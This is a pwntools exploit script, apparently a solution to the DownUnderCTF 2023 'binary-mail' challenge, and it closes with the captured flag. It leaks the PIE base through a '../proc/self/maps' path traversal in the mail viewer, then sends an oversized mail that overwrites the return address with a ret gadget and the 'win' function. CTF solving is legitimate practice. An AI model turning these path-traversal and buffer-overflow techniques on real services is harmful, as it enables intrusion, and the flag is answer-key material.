#!/usr/bin/env python3
from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./binary-mail")
libc = elf.libc
# libc = ELF("./libc.so.6")

TAG_INPUT_ANS    = 3
TAG_COMMAND      = 4

def write_taglen(TAG: int, size: int) -> None:
    p.send(p32(TAG) + p64(size))

def command(cmd) -> None:
    write_cmdlen(len(cmd))
    p.send(cmd)

register = lambda: command("register")
_view_mail = lambda: command("view_mail")
_send_mail = lambda: command("send_mail")

write_cmdlen = lambda x: write_taglen(TAG_COMMAND, x)
write_anslen = lambda x: write_taglen(TAG_INPUT_ANS, x)

def register_user(username: str, password: str) -> None:
    register()
    write_anslen(len(username))
    p.send(username)  # username
    write_anslen(len(password))
    p.send(password) # password

def send_mail(sender: str, sender_pass: str, receiver: str, message: str) -> None:
    _send_mail()
    write_anslen(len(sender))
    p.send(sender)
    write_anslen(len(sender_pass))
    p.send(sender_pass)
    write_anslen(len(receiver))
    p.send(receiver)
    write_anslen(len(message))  # message
    p.send(message)

def view_mail(user: str, password: str) -> None:
    _view_mail()
    write_anslen(len(user))
    p.send(user)
    write_anslen(len(password))
    p.send(password)

def spam(times: int, sender: str, sender_pass: str, receiver: str, message: str) -> None:
    for _ in range(times):
        send_mail(sender, sender_pass, receiver, message)


gdbscript = """
b *view_mail+438
c
"""

p = remote("2023.ductf.dev", 30011)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)

# register
register_user(b'come', 'duck')
register_user(b'kick', 'duck')

# read mail
view_mail('../proc/self/maps', 'duck')

p.recvuntil(b"got invalid taglen ")
data = [int(x) for x in p.recv().strip().split(b' ')]
elf.address = int(b''.join(pack(x, 'all') for x in data).decode(), 16)

print(f"[+] Pie leak: {hex(elf.address)}")
print(f"[+] Win leak: {hex(elf.sym['win'])}")

ret = ROP(elf).ret[0]

register_user(b'A'*127, b'ditch')
send_mail('come', 'duck', 'A'*127, b'A'*111 + p32(7) + p64(0xffffffffffffffff) + b'Z'*900)
send_mail('come', 'duck', 'A'*127, b'A'*137 + p64(ret) + p64(elf.sym['win']))

view_mail('A'*127, 'ditch')

p.interactive()
# DUCTF{y0uv3_g0t_ma1l_and_1ts_4_flag_cada60be8ab71a}